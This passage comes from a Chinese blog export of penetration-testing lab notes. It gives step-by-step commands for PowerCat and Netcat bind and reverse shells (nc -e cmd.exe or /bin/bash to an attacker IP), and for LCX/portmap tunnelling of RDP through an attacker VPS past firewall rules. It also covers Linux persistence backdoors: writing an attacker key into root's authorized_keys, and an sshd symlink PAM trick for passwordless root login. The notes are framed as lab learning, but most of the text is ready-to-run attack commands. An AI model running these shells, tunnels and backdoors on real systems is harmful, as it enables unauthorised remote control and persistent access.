class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image018.gif" alt="img"></p><h3 id="2、攻击机使用powercat监听，执行以下命令"><a href="#2、攻击机使用powercat监听，执行以下命令" class="headerlink" title="2、攻击机使用powercat监听，执行以下命令"></a>2、攻击机使用powercat监听，执行以下命令</h3><pre class="line-numbers language-none"><code class="language-none">powercat -l -p  9999 -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image016.gif" alt="img"></p><p><img src="assets/clip_image019.jpg" alt="img"></p><h2 id="PowerCat文件传输"><a href="#PowerCat文件传输" class="headerlink" title="PowerCat文件传输                                   "></a><strong>PowerCat</strong>文件传输                                  <a href="af://n84"> </a></h2><h3 id="1、靶机使用powercat监听，接收，执行以下命令"><a href="#1、靶机使用powercat监听，接收，执行以下命令" class="headerlink" title="1、靶机使用powercat监听，接收，执行以下命令"></a>1、靶机使用powercat监听，接收，执行以下命令</h3><pre class="line-numbers language-none"><code class="language-none">powercat -l -p 9999 -of test.txt -v  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image020.jpg" alt="img"></p><h3 id="2、攻击机使用powercat连，传，执行以下命令"><a href="#2、攻击机使用powercat连，传，执行以下命令" class="headerlink" title="2、攻击机使用powercat连，传，执行以下命令"></a>2、攻击机使用powercat连，传，执行以下命令</h3><pre class="line-numbers language-none"><code class="language-none">powercat -c  192.168.70.8 -p 9999 -i desktop\test.txt -v <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image022.gif" alt="img"></p><h3 id="3、查看返回结果-2"><a href="#3、查看返回结果-2" class="headerlink" title="3、查看返回结果"></a>3、查看返回结果</h3><p><img src="assets/clip_image024.gif" alt="img"></p><h2 id="用powercat生成payload"><a href="#用powercat生成payload" class="headerlink" title="用powercat生成payload                                "></a>用<strong>powercat</strong>生成<strong>payload</strong>                               <a href="af://n99"> </a></h2><h3 id="1、攻击机使用powercat执行以下命令生成payload"><a href="#1、攻击机使用powercat执行以下命令生成payload" class="headerlink" title="1、攻击机使用powercat执行以下命令生成payload"></a>1、攻击机使用powercat执行以下命令生成payload</h3><pre class="line-numbers language-none"><code class="language-none">powercat -l -p 8000 -e cmd -v -g &gt;&gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image026.gif" alt="img"></p><h3 id="2、攻击机使用powercat执行以下命令连接"><a href="#2、攻击机使用powercat执行以下命令连接" class="headerlink" title="2、攻击机使用powercat执行以下命令连接"></a>2、攻击机使用powercat执行以下命令连接</h3><pre class="line-numbers language-none"><code class="language-none">powercat -c 192.168.70.7 -p 8000 -v <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image027.jpg" alt="img"></p><h3 id="3、在靶机上运行脚本"><a href="#3、在靶机上运行脚本" class="headerlink" title="3、在靶机上运行脚本"></a>3、在靶机上运行脚本</h3><pre class="line-numbers language-none"><code class="language-none">.\shell.ps1  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image029-168398341552543.gif" alt="img"></p><h3 id="4、查看运行结果"><a href="#4、查看运行结果" class="headerlink" title="4、查看运行结果"></a>4、查看运行结果</h3><p><img src="assets/clip_image031.gif" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/16-nei-wang-dai-li/3.netcat-fan-dan-shell/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/16-nei-wang-dai-li/3.netcat-fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<h1 id="Netcat反弹Shell"><a href="#Netcat反弹Shell" class="headerlink" title="Netcat反弹Shell"></a>Netcat反弹Shell</h1><p><code>Netcat</code>简称NC,是一个简单、可靠的网络工具,被誉为网络界的瑞士军刀。</p><p>通NC可以进行端口扫描、反弹Shell、端口监听和文件传输等操作,常用参数如下：</p><table><thead><tr><th>-<strong>c</strong></th><th>指定连接后要执行的<strong>shell</strong>命令</th></tr></thead><tbody><tr><td>-e</td><td>指定连接后要执行的文件名</td></tr><tr><td>-k</td><td>配置 Socket一直存活(若不想退出 Shell后使监听断开可使用此参数)</td></tr><tr><td>-l</td><td>监听模式</td></tr><tr><td>-p</td><td>设置本地主机使用的通信端口</td></tr><tr><td>-u</td><td>使用UDP传输协议,默认为TCP</td></tr><tr><td>-v</td><td>显示指令执行过程,用-vv会更详细</td></tr></tbody></table><pre class="line-numbers language-none"><code class="language-none">nc -lvvp 1111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="一、正向反弹Shell"><a href="#一、正向反弹Shell" class="headerlink" title="一、正向反弹Shell"></a>一、正向反弹<strong>Shell</strong></h2><h3 id="1、实验拓扑"><a href="#1、实验拓扑" class="headerlink" title="1、实验拓扑"></a><strong>1</strong>、实验拓扑</h3><p><img src="assets/clip_image001.jpg" alt="img"></p><table><thead><tr><th>机器名称</th><th>机器<strong>IP</strong></th></tr></thead><tbody><tr><td>攻击机器</td><td>192.168.3.27</td></tr><tr><td>目标靶机</td><td>192.168.3.29</td></tr></tbody></table><h3 id="2、实验介绍"><a href="#2、实验介绍" class="headerlink" title="2、实验介绍"></a><strong>2</strong>、实验介绍</h3><p>攻击者机器 <code>192.168.3.27</code> 和靶机<img src="assets/clip_image005-168398338723211.gif" alt="img"> <code>192.168.3.29</code><img src="assets/clip_image007-168398338723212.gif" alt="img">可以相互的访问， 这个时候可以使用正向shell</p><h3 id="3、实验复现"><a href="#3、实验复现" class="headerlink" title="3、实验复现"></a><strong>3</strong>、实验复现</h3><h4 id="1-在靶机上运行："><a href="#1-在靶机上运行：" class="headerlink" title="\1) 在靶机上运行："></a>\1) 在靶机上运行：</h4><pre class="line-numbers language-none"><code class="language-none">nc -lvvp 1111 -e  C:\Windows\System32\cmd.exe  windows机器  nc -lvvp 1111 -e  /bin/bash  linux机器  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/clip_image009.gif" alt="img"></p><h4 id="2-在攻击机上运行"><a href="#2-在攻击机上运行" class="headerlink" title="\2) 在攻击机上运行"></a>\2) 在攻击机上运行</h4><pre class="line-numbers language-none"><code class="language-none">nc 192.168.3.29 1111  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image010-168398338723213.jpg" alt="img"></p><h4 id="3-拿到正向的shell"><a href="#3-拿到正向的shell" class="headerlink" title="\3) 拿到正向的shell"></a>\3) 拿到正向的shell</h4><p><img src="assets/clip_image012-168398338723214.gif" alt="img"></p><h2 id="二、反向反弹Shell"><a href="#二、反向反弹Shell" class="headerlink" title="二、反向反弹Shell"></a>二、反向反弹<strong>Shell</strong></h2><h3 id="1、实验拓扑-1"><a href="#1、实验拓扑-1" class="headerlink" title="1、实验拓扑"></a><strong>1</strong>、实验拓扑</h3><p><img src="assets/clip_image001.jpg" alt="img"></p><table><thead><tr><th>机器名称</th><th>机器<strong>IP</strong></th></tr></thead><tbody><tr><td>攻击机器</td><td>192.168.3.27</td></tr><tr><td>目标靶机</td><td>192.168.3.29</td></tr></tbody></table><h3 id="2、实验介绍-1"><a href="#2、实验介绍-1" class="headerlink" title="2、实验介绍"></a><strong>2</strong>、实验介绍</h3><p>攻击者机器<code>192.168.3.27</code>不能直接访问靶机， 但是靶机<img src="assets/clip_image019.gif" alt="img"> <code>192.168.3.29</code>可以访问攻击者的机器， 这个时候使用反 向shell</p><h3 id="3、实验复现-1"><a href="#3、实验复现-1" class="headerlink" title="3、实验复现"></a><strong>3</strong>、实验复现</h3><h4 id="1-在攻击者机器运行"><a href="#1-在攻击者机器运行" class="headerlink" title="\1) 在攻击者机器运行"></a>\1) 在攻击者机器运行</h4><pre class="line-numbers language-none"><code class="language-none">nc -lvvp 1111 监听1111端口  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-在靶机上运行-反弹到公网"><a href="#2-在靶机上运行-反弹到公网" class="headerlink" title="\2)  在靶机上运行  (反弹到公网)"></a>\2)  在靶机上运行  (反弹到公网)</h4><pre class="line-numbers language-none"><code class="language-none">nc -e C:\Windows\System32\cmd.exe  192.168.3.27 1111  windos机器  nc -e  /bin/bash  192.168.3.27 1111  linux机器  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3-拿到反向的shell"><a href="#3-拿到反向的shell" class="headerlink" title="\3) 拿到反向的shell"></a>\3) 拿到反向的shell</h4><p><img src="assets/clip_image021.jpg" alt="img"></p><h2 id="三、-Nc的其他用法"><a href="#三、-Nc的其他用法" class="headerlink" title="三、 Nc的其他用法"></a>三、 <strong>Nc</strong>的其他用法</h2><h3 id="1、-Banner-的抓取"><a href="#1、-Banner-的抓取" class="headerlink" title="1、 Banner 的抓取"></a><strong>1</strong>、 <strong>Banner</strong> 的抓取</h3><p>靶机运行着ssh服务， 可以查看服务的版本</p><pre class="line-numbers language-none"><code class="language-none">nc -nv IP Port  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image023.gif" alt="img"></p><h3 id="2、端口探测"><a href="#2、端口探测" class="headerlink" title="2、端口探测"></a><strong>2</strong>、端口探测</h3><h4 id="可以查看端口的开放情况"><a href="#可以查看端口的开放情况" class="headerlink" title="可以查看端口的开放情况"></a>可以查看端口的开放情况</h4><pre class="line-numbers language-none"><code class="language-none">nc -v IP Port <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image025.gif" alt="img"></p><h4 id="多端口扫描："><a href="#多端口扫描：" class="headerlink" title="多端口扫描："></a>多端口扫描：</h4><pre class="line-numbers language-none"><code class="language-none">nc -v -z IP 1-65535  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image029.gif" alt="img"></p><h3 id="3、端口监听"><a href="#3、端口监听" class="headerlink" title="3、端口监听"></a><strong>3</strong>、端口监听</h3><p>监听端口， 当访问该端口会输出该信息</p><pre class="line-numbers language-none"><code class="language-none">nc -l -p Port  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image030.jpg" alt="img"></p><h3 id="4、文件传输"><a href="#4、文件传输" class="headerlink" title="4、文件传输"></a><strong>4</strong>、文件传输</h3><pre class="line-numbers language-none"><code class="language-none">接受端： nc -lp Port &gt; file发送端： nc -vn IP Port &lt; file -q 1 (windows是-w， Linux是-q)nc -lp 1111 &gt; 1.txtnc -vn 192.168.70.8 1111 &lt; 1.txt -w 1type 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1、-接收端文件夹下为空"><a href="#1、-接收端文件夹下为空" class="headerlink" title="1、  接收端文件夹下为空"></a>1、  接收端文件夹下为空</h4><p><img src="assets/clip_image032.gif" alt="img"></p><h4 id="2、-接收端执行命令"><a href="#2、-接收端执行命令" class="headerlink" title="2、  接收端执行命令"></a>2、  接收端执行命令</h4><p><img src="assets/clip_image034.gif" alt="img"></p><p><img src="assets/clip_image035.jpg" alt="img"></p><h4 id="4、-接收端接收到文件"><a href="#4、-接收端接收到文件" class="headerlink" title="4、  接收端接收到文件"></a>4、  接收端接收到文件</h4><p><img src="assets/clip_image037.gif" alt="img"></p><h3 id="5、简易聊天"><a href="#5、简易聊天" class="headerlink" title="5、简易聊天"></a><strong>5</strong>、简易聊天</h3><h4 id="1、vps执行"><a href="#1、vps执行" class="headerlink" title="1、vps执行"></a>1、vps执行</h4><pre class="line-numbers language-none"><code class="language-none">nc -l -p Portnc -lp 1111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/clip_image039.gif" alt="img"></p><h4 id="2、靶机执行："><a href="#2、靶机执行：" class="headerlink" title="2、靶机执行："></a>2、靶机执行：</h4><pre class="line-numbers language-none"><code class="language-none">nc -vn IP Portnc -vn 192.168.70.8 1111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/clip_image040.jpg" alt="img"></p><h3 id="6、连接远程主机"><a href="#6、连接远程主机" class="headerlink" title="6、连接远程主机"></a><strong>6</strong>、连接远程主机</h3><pre class="line-numbers language-none"><code class="language-none">命令 nc -nvv IP port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/16-nei-wang-dai-li/2.duan-kou-zhuan-fa/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/16-nei-wang-dai-li/2.duan-kou-zhuan-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="LCX介绍"><a href="#LCX介绍" class="headerlink" title="LCX介绍"></a><strong>LCX</strong>介绍</h1><p>LCX是一款端口转发工具， 分为Windows版和Linux版，  Linux版本为PortMap。 LCX有端口映射和端口转发两大功 能，</p><p> 例如当目标的3389端口只对内开放而不对外开放时， 可以使用端口映射将3389端口映射到目标的其他端口使 用； 当目标处于内网或目标配置的策略只允许访问固定某一端口时， 可以通过端口转发突破限制。  </p><h2 id="Windows版的-LCX用法"><a href="#Windows版的-LCX用法" class="headerlink" title="Windows版的 LCX用法:"></a>Windows版的 LCX用法:</h2><pre class="line-numbers language-none"><code class="language-none">端口转发：Lcx -listen &lt;监听slave请求的端口&gt;&lt;等待连接的端口&gt;Lcx -slave &lt;攻击机IP&gt;&lt;监听端口&gt;&lt;目标IP&gt;&lt;目标端口&gt;端口映射：Lcx -tran &lt;等待连接的端口&gt;&lt;目标IP&gt;&lt;日标端口&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Linux版的LCX用法"><a href="#Linux版的LCX用法" class="headerlink" title="Linux版的LCX用法:"></a>Linux版的LCX用法:</h2><pre class="line-numbers language-none"><code class="language-none">Usage:./portmap -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename]-v: version-h1: host1-h2: host2-p1: port1-p2: port2-log: log the data-m: the action method for this tool1: listen on PORT1 and connect to HOST2:PORT22: listen on PORT1 and PORT23: connect to HOST1:PORT1 and HOST2:PORT2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="LCX实验一"><a href="#LCX实验一" class="headerlink" title="LCX实验一"></a><strong>LCX</strong>实验一</h1><h2 id="一、实验场景"><a href="#一、实验场景" class="headerlink" title="一、实验场景"></a>一、实验场景</h2><p>由于配置了防火墙只允许web访问， 这个时候攻击者想访问3389端口， 远程连接是不可以的， 就需要使用LCX进行 端口转发</p><p>Web服务器开启了80端口， 3389端口不允许出网， 可以将web服务器的3389端口转发到允许出网的53端口， 这个 时候攻击者在本地监听53端口并且转发到1111端口， 这个时候攻击者连接自己的1111端口， 等于访问web服务器 的3389端口</p><p><img src="assets/clip_image003.jpg" alt="img"></p><h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>机器介绍如下 </p><table><thead><tr><th>机器名称</th><th>机器<strong>IP</strong></th></tr></thead><tbody><tr><td>攻击机器</td><td>192.168.70.7</td></tr><tr><td>web服务器</td><td>192.168.70.8</td></tr></tbody></table><h2 id="三、实验复现"><a href="#三、实验复现" class="headerlink" title="三、实验复现"></a>三、实验复现</h2><h3 id="1、在攻击机器上运行以下命令，"><a href="#1、在攻击机器上运行以下命令，" class="headerlink" title="1、在攻击机器上运行以下命令，"></a>1、在攻击机器上运行以下命令，</h3><p>监听本地53端口并且转发到本地1111端口</p><pre class="line-numbers language-none"><code class="language-none">lcx -listen 53 1111  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image005.gif" alt="img"></p><h3 id="2、在web靶机上运行以下命令，"><a href="#2、在web靶机上运行以下命令，" class="headerlink" title="2、在web靶机上运行以下命令，"></a>2、在web靶机上运行以下命令，</h3><p>将本地的3389端口转发到192.168.70.7的 53端口</p><pre class="line-numbers language-none"><code class="language-none">lcx.exe -slave 192.168.70.7 53 127.0.0.1 3389  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image007.gif" alt="img"></p><h3 id="3、在攻击机器上运行远程桌面，-地址为127-0-0-1-1111"><a href="#3、在攻击机器上运行远程桌面，-地址为127-0-0-1-1111" class="headerlink" title="3、在攻击机器上运行远程桌面， 地址为127.0.0.1:1111"></a>3、在攻击机器上运行远程桌面， 地址为127.0.0.1:1111</h3><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:1111hack$123456kl;'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/clip_image008.jpg" alt="img"></p><h1 id="LCX实验二"><a href="#LCX实验二" class="headerlink" title="LCX实验二"></a><strong>LCX</strong>实验二</h1><h2 id="一、实验场景-1"><a href="#一、实验场景-1" class="headerlink" title="一、实验场景"></a>一、实验场景</h2><p>Web服务器开启了80端口， 3389端口不允许出网， 可以将web服务器的3389端口转发到允许出网的54端口， 这个 时候攻击者在VPS监听54端口并且转发到1111端口， 这个时候攻击者连接VPS的1111端口， 等于访问web服务器的 3389端口</p><p><img src="assets/clip_image009.jpg" alt="img"></p><h2 id="二、实验环境-1"><a href="#二、实验环境-1" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><table><thead><tr><th>机器名称</th><th>机器<strong>IP</strong></th></tr></thead><tbody><tr><td>攻击者VPS</td><td>47.120.13.249</td></tr><tr><td>内网攻击者机器</td><td>192.168.220.2</td></tr><tr><td>内网靶机</td><td>192.168.70.8</td></tr></tbody></table><h2 id="三、实验复现-1"><a href="#三、实验复现-1" class="headerlink" title="三、实验复现"></a>三、实验复现</h2><h3 id="1、在攻击机器上运行以下命令，-1"><a href="#1、在攻击机器上运行以下命令，-1" class="headerlink" title="1、在攻击机器上运行以下命令，"></a>1、在攻击机器上运行以下命令，</h3><p>监听本地54端口并且转发到本地1111端口</p><pre class="line-numbers language-none"><code class="language-none">lcx -slave 47.120.13.249 54 127.0.0.1 3389  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image010.jpg" alt="img"></p><h3 id="2、在vps运行"><a href="#2、在vps运行" class="headerlink" title="2、在vps运行"></a>2、在vps运行</h3><p><code>lcx -listen 54 1111</code>，</p><p> 因为我的机器vps机器是linux系统所以使用<code>portmap</code></p><pre class="line-numbers language-none"><code class="language-none">./portmap -m 2 -p1 54 -p2 1111 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image012.gif" alt="img"></p><h3 id="3、在那内攻击机器上连接"><a href="#3、在那内攻击机器上连接" class="headerlink" title="3、在那内攻击机器上连接"></a>3、在那内攻击机器上连接</h3><pre class="line-numbers language-none"><code class="language-none">47.120.13.249:1111hack$123456kl;'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/clip_image013.jpg" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/9.linux-quan-xian-wei-chi-gong-si-yao/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/9.linux-quan-xian-wei-chi-gong-si-yao/</url>
      
        <content type="html"><![CDATA[<h1 id="公钥介绍"><a href="#公钥介绍" class="headerlink" title="公钥介绍"></a>公钥介绍</h1><p>使用密码登录， 每次都必须输入密码， 非常麻烦。好在SSH还提供了公钥登录， 可以省去输入密码的步骤。  所   谓”公钥登录”， 原理很简单， 就是用户将自己的公钥储存在远程主机上。登录的时候， 远程主机会向用户发送一段 随机字符串， 用户用自己的私钥加密后， 再发回来。远程主机用事先储存的公钥进行解密， 如果成功， 就证明用户 是可信的， 直接允许登录shell， 不再要求密码。</p><h1 id="公钥维持"><a href="#公钥维持" class="headerlink" title="公钥维持                                           "></a>公钥维持                                          <a href="af://n7"> </a></h1><h2 id="1、在需要登录服务器的机器上生成公钥和私钥"><a href="#1、在需要登录服务器的机器上生成公钥和私钥" class="headerlink" title="1、在需要登录服务器的机器上生成公钥和私钥"></a>1、在需要登录服务器的机器上生成公钥和私钥</h2><p> 我使用的windows就用windos生成</p><pre class="line-numbers language-none"><code class="language-none">ssh-keygen -t rsa  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>中间按3此回车</p><p><img src="assets/clip_image001-168396135692576.jpg" alt="img"></p><h2 id="2、将生成的-id-rsa-pub文件复制到服务器的"><a href="#2、将生成的-id-rsa-pub文件复制到服务器的" class="headerlink" title="2、将生成的 id_rsa.pub文件复制到服务器的"></a>2、将生成的 id_rsa.pub<img src="assets/clip_image003-168396135692677.gif" alt="img">文件复制到服务器的</h2><p><code>/root/.ssh/authorized_keys</code><img src="assets/clip_image005-168396135692678.gif" alt="img">文件中</p><pre class="line-numbers language-none"><code class="language-none">cat id_rsa.pubecho ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0x036GOwJecqZ2rB7UKadI2R8NuPgcETKDLgwm6Wvze2wo+MPN2FgVrjXDpw/o6cwY49Ee6m30WCMpbu1KNyXDhNG6DAsD+tGhxjX8YvY02mYpsiEalNtPzNtczLVkpQwCuQlnIwyBx68YdungCEYwUT2CiZIyUoMOP1jphwFurkHchgVx4gPo9JS/SLmmXM/Ks4o/HEZ+03RYHFa/H0yyjAPwEEbHB3xGz29lgkSGtxp954rtM2SeTTqzRTppzFbGkXmoGtbc0m0hfITN+YBpf3kJfUwnRHXOo2xOyqw0d2tv5GakDHjrhC4NQ6rzWSiE2dm49DBKwbcFCG/CqqnJJQwtDzZIPk1jYZOgVvnPyWCdm6pzVfevNdpam9vDWrp8rIS7AM6L9QcV9QFASO51/cq/auFNHA7+gnmfFiucXQXQvM8lcGlvieJ8yIlycByPE7wgXPWX+1orfIthyRRURO55sr12QLTSw1oiiuePwIGX+tKrDTyrXMoz5gz+j8= 17452727@qq.com &gt; /root/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/clip_image007-168396135692679.gif" alt="img"></p><h2 id="3、查看服务器中-x2F-etc-x2F-ssh-x2F-sshd-confg文件是否开启了公私钥登录"><a href="#3、查看服务器中-x2F-etc-x2F-ssh-x2F-sshd-confg文件是否开启了公私钥登录" class="headerlink" title="3、查看服务器中/etc/ssh/sshd_confg文件是否开启了公私钥登录"></a>3、查看服务器中/etc/ssh/sshd_confg文件是否开启了公私钥登录</h2><pre class="line-numbers language-none"><code class="language-none">cat /etc/ssh/sshd_config | grep .ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image008-168396135692680.jpg" alt="img"></p><h2 id="4、尝试登录"><a href="#4、尝试登录" class="headerlink" title="4、尝试登录"></a>4、尝试登录</h2><p><img src="assets/clip_image009-168396135692681.jpg" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/8.linux-quan-xian-wei-chi-pam-ruan-lian-jie/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/8.linux-quan-xian-wei-chi-pam-ruan-lian-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h1><h2 id="PAM介绍"><a href="#PAM介绍" class="headerlink" title="PAM介绍"></a><strong>PAM</strong>介绍</h2><p>PAM认证一般遵循这样的顺序： Service(服务)→ PAM(配置文件)→ pam_*.so。 PAM认证首先要确定那一项服务 ，  然后加载相应的PAM的配置文件(位于/etc/pam.d下)， 最后调用认证文件(位于/lib/security下)进行安全认证， 用户 访问服务器的时候， 服务器的某一个服务程序把用户的谁请求发送到PAM模块进行认证。对于不同的服务器应用程</p><p>序所对应的PAM模块也是不同的。如果想查看某个程序是否支持PAM使用 <code>ls /etc/pam.d</code> <img src="assets/clip_image002-168396103987662.gif" alt="img">，</p><p><img src="assets/clip_image004-168396103987763.gif" alt="img"></p><h2 id="软连接介绍"><a href="#软连接介绍" class="headerlink" title="软连接介绍"></a>软连接介绍</h2><p>软连接称之为符号连接 ( Symbolic Link) ， 也叫软连接。软链接文件有类似于Windows的快捷方式。它实际上是</p><p>一个特殊的文件。在符号连接中， 文件实际上是一个文本文件， 其中包含的有另一文件的位置信息。 下来做个实验演示演示一下</p><pre class="line-numbers language-none"><code class="language-none">touch test.txt //创建test.txt文件  ln -fs /var/www/html/1.txt test.txt  cat test.txt <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/clip_image005-168396103987765.jpg" alt="img"></p><p><code>ln</code>命令介绍</p><pre class="line-numbers language-none"><code class="language-none">-f, --force 强行删除任何已存在的目标文件-s, --symbolic 制作符号链接而不是硬链接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="后门原理"><a href="#后门原理" class="headerlink" title="后门原理"></a>后门原理</h1><p>ssd软连接是 Linux下很经典的一种权限维持方法,其中涉及的一个比较重要的模块是“ <code>pam_rootok.so</code>”模块,</p><p>“pam_rootok.so”模块的功能是若用户UID是0,返回成功， 当“ /etc/pam. d/ssh”文件配置了“ auth suicient   pam_rootok.so”时可以不需要密码登录。</p><p>当在被控制端执行命令“<code>ln -sf /usr/sbin/shd /tmp/su;/tmp/su -oPort=1234</code>”建立shd的软连接后门,PAM认证时会根据软连接的名字到“/etc/pam. d”目录寻找对应到PAM认证文 件,</p><p>由于软连接的文件名为“su”,所以SSH的认证文件就被替换成了“<code>/ 'etc/pam.d/su</code>”,而“su”中默认配置了“ auth   suicient pam_rootok.so”,从而导致SSH可以不需要密码登录。</p><h2 id="软连接维持"><a href="#软连接维持" class="headerlink" title="软连接维持                                         "></a>软连接维持                                        <a href="af://n23"> </a></h2><h3 id="1、判断此计算机SSH是否开启了PAM认证"><a href="#1、判断此计算机SSH是否开启了PAM认证" class="headerlink" title="1、判断此计算机SSH是否开启了PAM认证"></a>1、判断此计算机SSH是否开启了PAM认证</h3><pre class="line-numbers language-none"><code class="language-none">cat /etc/ssh/sshd_config |grep UsePAM  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image006-168396103987764.jpg" alt="img"></p><h3 id="2、查看pmd-m文件下哪些文件配置了pam-rootok"><a href="#2、查看pmd-m文件下哪些文件配置了pam-rootok" class="headerlink" title="2、查看pmd.m文件下哪些文件配置了pam_rootok"></a>2、查看pmd.m文件下哪些文件配置了pam_rootok</h3><pre class="line-numbers language-none"><code class="language-none">find /etc/pam.d |xargs  grep "pam_rootok"  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image008-168396103987766.gif" alt="img"></p><h3 id="3、以root权限建软连接"><a href="#3、以root权限建软连接" class="headerlink" title="3、以root权限建软连接"></a>3、以root权限建软连接</h3><pre class="line-numbers language-none"><code class="language-none">ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oPort=23333  ln -sf /usr/sbin/sshd /tmp/chsh  建立sshd的软连接/tmp/chsh -oPort=23333 更改端口为23333<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4、进行登录"><a href="#4、进行登录" class="headerlink" title="4、进行登录"></a>4、进行登录</h3><pre class="line-numbers language-none"><code class="language-none">ssh root@[IP地址] -p [后门端口] 不需要密码(随便输密码) ssh root@192.168.41.134 -p 23333<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/clip_image012-168396103987768.gif" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/7.linux-quan-xian-wei-chi-suid/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/15-quan-xian-wei-chi/7.linux-quan-xian-wei-chi-suid/</url>
      
        <content type="html"><![CDATA[<h1 id="SUID介绍"><a href="#SUID介绍" class="headerlink" title="SUID介绍                                           "></a><strong>SUID</strong>介绍                                          <a href="af://n3"> </a></h1><p>SUID是一种特殊权限， 设置了suid的程序文件， 在用户执行该程序时， 用户的权限是该程序文件属主的权限， 例如 程序文件的属主是root， 那么执行该程序的用户就将暂时获得root账户的权限。sgid与suid类似， 只是执行程序时 获得的是文件属组的权限。 passwd这个命令程序的权限设置， 它就是设置了suid权限的</p><p><img src="assets/clip_image001-168396076560850.jpg" alt="img"></p><p>注意以下几点：</p><ol><li>只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义.</li><li>命令执行者要对该程序文件拥有执行(x)权限.</li><li>命令执行者在执行该程序时获得该程序文件属主的身份.</li><li>SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效</li></ol><h1 id="SUID维持"><a href="#SUID维持" class="headerlink" title="SUID维持                                           "></a><strong>SUID</strong>维持                                          <a href="af://n23"> </a></h1><h2 id="1、找到bash文件"><a href="#1、找到bash文件" class="headerlink" 